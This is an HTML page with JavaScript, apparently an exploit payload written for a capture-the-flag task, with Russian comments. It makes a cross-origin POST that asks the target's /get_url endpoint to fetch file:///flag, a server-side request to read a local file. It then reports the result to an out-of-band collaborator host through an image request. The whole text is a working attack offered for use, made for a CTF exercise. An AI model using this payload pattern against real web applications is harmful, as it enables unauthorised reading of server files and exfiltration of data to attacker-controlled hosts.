<!DOCTYPE html>
<script>
const TARGET = 'https://tasks.goidactf.ru:20185';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Создаём FormData
const formData = new FormData();
// НЕ РАБОТАЕТ - FormData создаёт multipart/form-data

// Вместо этого используем Blob с правильным Content-Type
const blob = new Blob(
    [JSON.stringify({url: 'file:///flag'})],
    {type: 'application/json'}
);

const xhr = new XMLHttpRequest();
xhr.open('POST', TARGET + '/get_url');
xhr.send(blob);

xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        new Image().src = COLLAB + '/?blob_status=' + xhr.status;
    }
};
</script>
